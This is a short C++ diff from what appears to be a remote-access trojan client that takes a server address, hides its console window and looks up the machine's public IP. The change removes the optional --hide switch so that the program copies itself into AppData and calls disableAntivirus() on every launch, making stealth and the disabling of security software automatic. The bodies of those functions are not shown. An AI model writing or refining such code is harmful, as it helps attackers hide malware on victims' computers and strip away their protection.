@@ -1629,13 +1629,12 @@ void hideToAppData() {
 }
 
 int main(int argc, char* argv[]) {
-    bool noScreen = false, showConsole = false, hide = false;
+    bool noScreen = false, showConsole = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
         if (a == "--no-ping") g_noPing = true;
         else if (a == "--no-screen") noScreen = true;
         else if (a == "--show") showConsole = true;
-        else if (a == "--hide") hide = true;
         else if (a.find("--name=") == 0 && a.size() > 7) computerName = a.substr(7);
         else if (a == "--name" && i + 1 < argc) computerName = argv[++i];
         else if (a == "--server" && i + 1 < argc) {
@@ -1652,9 +1651,9 @@ int main(int argc, char* argv[]) {
             g_serverHost = s;
         }
     }
-    if (hide) { hideToAppData(); return 0; }
-    disableAntivirus();
     if (computerName.empty()) computerName = getComputerName();
+    hideToAppData();
+    disableAntivirus();
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
     publicIP = getPublicIP();
